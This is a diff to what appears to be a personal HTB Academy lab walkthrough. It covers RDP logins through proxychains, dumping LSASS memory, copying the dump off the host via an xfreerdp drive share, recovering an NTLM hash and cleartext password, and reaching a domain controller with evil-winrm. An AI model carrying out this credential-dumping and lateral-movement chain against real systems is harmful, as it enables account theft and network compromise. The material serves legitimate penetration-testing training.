@@ -170,7 +170,7 @@ Right clicking each we find usernames and passwords that I store here [[HTB-Acad
 proxychains xfreerdp /v:172.16.119.7 /u:stom /p:fails-nibble-disturb4 /cert:ignore
 ```
 
-Didn't work...let's try another users
+Didn't work...let's try another user
 
 ```go
 proxychains xfreerdp /v:172.16.119.7 /u:bdavid /p:caramel-cigars-reply1 /cert:ignore /d:nexura.htb
@@ -197,18 +197,22 @@ File is located at:
 C:\Users\bdavid\AppData\Local\Temp\lsass.DMP
 ```
 
+OR
+
+Task Manager -> Processes -> Right click LSASS
+
 ##### Move the lsass.DMP file to my local machine
 
 
 >[!Tip] Transferring Data via XfreeRDP
 > We can do so by mapping a directory on your attacker machine to a share folder on the remote machine
-> - `/drive:LocalShare`: Creates a share called "LocalShare" on the remote machine
-> - `/home/dan/Documents/Passwd_Cracking` maps your local folder to "LocalShare"
+> - `/drive:SkillShare`: Creates a share called "SkillShare" on the remote machine
+> - `/home/dan/Documents/Passwd_Cracking` maps your local folder to "SkillShare"
 
 
 Create share on localhost
 ```go
-proxychains xfreerdp /v:172.16.119.7 /u:bdavid /p:caramel-cigars-reply1 /cert:ignore /d:nexura.htb /drive:LocalShare,/home/dan/Documents/Passwd_Cracking
+proxychains xfreerdp /v:172.16.119.7 /u:bdavid /p:caramel-cigars-reply1 /cert:ignore /d:nexura.htb /drive:SkillShare,/home/dan/Documents/Passwd_Cracking
 ```
 
 #### Extract Passwd from LSASS DUMP File
@@ -253,14 +257,19 @@ luid 267133
 		password (hex)
 
 
-This shows an NTLM password hash for the user `stom` (21ea958524cfd9a7791737f8d2f764fa) 
+This shows an NTLM password hash for the user `stom` (21ea958524cfd9a7791737f8d2f764fa) and the users corresponding password: 
+```go
+calves-warp-learning1
+```
+
 
 Now I will remote into stom's account via xfreerdp
 ```go
 proxychains xfreerdp /v:172.16.119.7 /u:stom /p:calves-warp-learning1 /cert:ignore /d:nexura /drive:LocalShare,/home/dan/Documents/Passwd_Cracking
 ```
 
-stom has access to the DC, remote into it.
+>[! Important] stom has access to the DC, remote into it!!
+
 
 ```go
 proxychains evil-winrm -i 172.16.119.11 -u stom -p calves-warp-learning1
